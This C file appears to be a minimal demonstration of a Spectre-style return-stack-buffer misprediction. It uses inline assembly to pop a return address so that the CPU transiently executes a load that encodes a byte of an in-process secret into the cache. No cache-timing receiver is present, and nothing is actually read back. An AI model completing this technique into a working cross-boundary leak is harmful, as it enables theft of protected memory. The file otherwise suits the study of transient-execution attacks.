#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


// inaccessible secret
char SECRET[] = "INACCESSIBLE SECRET"; // no define here

unsigned char data[128];
int idx;

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  asm volatile("pop %%rax\n" : : : "rax");
  return 0;
}

int __attribute__ ((noinline)) call_leak() {
  // Manipulate the stack so that we don't return here, but to call_start
  call_manipulate_stack();
  asm volatile("mfence");
  // architecturally, this is never executed
  // Encode data in covert channel
  asm volatile("movq (%0), %%rax\n" : : "c"(SECRET[idx]) : "rax");
  return 2;
}

int __attribute__ ((noinline)) call_start() {
  call_leak();
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  call_start();
  call_leak();
  call_manipulate_stack();
}

int main(int argc, const char **argv) {

  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  leaked[sizeof(SECRET)] = 0;

  idx = 0;
  while(1) {
    // for every byte in the string
    idx = (idx + 1) % sizeof(SECRET);

    
    call_start();

  }


  return (0);
}
